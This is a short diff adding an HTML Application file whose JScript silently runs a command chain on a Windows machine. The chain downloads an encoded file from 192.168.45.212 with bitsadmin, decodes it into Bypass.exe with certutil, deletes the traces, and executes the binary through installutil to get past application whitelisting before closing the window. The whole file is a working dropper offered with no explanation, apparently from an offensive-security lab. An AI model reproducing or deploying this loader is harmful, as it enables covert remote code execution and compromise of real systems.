@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var command = "bitsadmin /Transfer myJob http://192.168.45.212/file.txt C:\\users\\public\\enc.txt && certutil -decode C:\\users\\public\\enc.txt C:\\users\\public\\Bypass.exe && del C:\\users\\public\\enc.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\users\\public\\Bypass.exe";
+var res = shell.Run("cmd.exe /c " + command, 0, true);
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
